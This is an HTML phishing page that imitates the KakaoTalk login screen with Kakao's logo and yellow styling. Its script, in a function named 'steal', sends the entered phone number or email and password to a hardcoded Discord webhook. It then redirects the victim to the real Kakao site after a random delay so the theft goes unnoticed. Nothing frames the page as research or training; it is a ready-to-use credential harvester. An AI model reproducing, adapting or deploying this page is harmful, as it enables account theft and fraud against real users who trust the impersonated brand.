<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>KakaoTalk</title>
  <link rel="icon" href="https://www.kakaocorp.com/favicon.ico">
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">

  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #fafafa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      width: 100%;
      max-width: 350px;
      margin: 80px auto;
      padding: 40px;
      background-color: white;
      border: 1px solid #dbdbdb;
      text-align: center;
    }

    .logo {
      width: 150px;
      margin-bottom: 10px;
    }

    input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      font-size: 14px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
    }

    button {
      background-color: #ffcc00; /* KakaoTalk's signature yellow color */
      border: none;
      color: white;
      padding: 8px;
      margin-top: 10px;
      width: 100%;
      font-weight: bold;
      border-radius: 4px;
      cursor: pointer;
    }

    .or-separator {
      margin: 20px 0;
      display: flex;
      align-items: center;
    }

    .or-separator::before,
    .or-separator::after {
      content: "";
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .or-separator span {
      margin: 0 10px;
      color: #8e8e8e;
      font-weight: 500;
      font-size: 13px;
    }
  </style>
</head>

<body>
  <div class="container">
    <!-- KakaoTalk logo (image) -->
    <img src="https://www.kakaocorp.com/img/logo/kor/logo-kakaotalk.png" alt="KakaoTalk" class="logo">

    <form onsubmit="steal(event)">
      <input id="username" type="text" placeholder="Phone number or email" required>
      <input id="password" type="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>

    <div class="or-separator"><span>OR</span></div>
    <div style="font-size: 14px; color: #ffcc00; font-weight: 500;">Log in with Kakao</div>
  </div>

  <script>
    function steal(e) {
      e.preventDefault(); // Prevent form submission to handle it in JS

      const u = document.getElementById("username").value;
      const p = document.getElementById("password").value;

      // Create the payload to send
      const data = {
        username: u,
        password: p
      };

      // Send the data to the Discord webhook
      fetch("https://discord.com/api/webhooks/1358102599647232202/4L51fQpmCq7hnbVud6P2AoYXGkpIrt2dYOts15JgJUb9LiEMeIxJJF5AdmDfJxtHlwFd", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `ðŸ›‘ ê°•ì•„ì§€\nUsername: ${data.username}\nPassword: ${data.password}`
        })
      })
      .then(response => {
        // Check if the request was successful
        if (response.ok) {
          console.log("Data sent successfully");

          // Slight random delay before redirecting to KakaoTalk
          setTimeout(() => {
            window.location.href = "https://www.kakaocorp.com"; // Redirect to KakaoTalk's official page after success
          }, Math.random() * 2000 + 1000);  // Random delay between 1-3 seconds
        } else {
          console.error('Request failed with status:', response.status);
          alert('Something went wrong. Please try again later.');
        }
      })
      .catch(error => {
        // Handle network errors
        console.error('Error during fetch:', error);
        alert('Network error. Please check your connection.');
      });
    }
  </script>
</body>
</html>
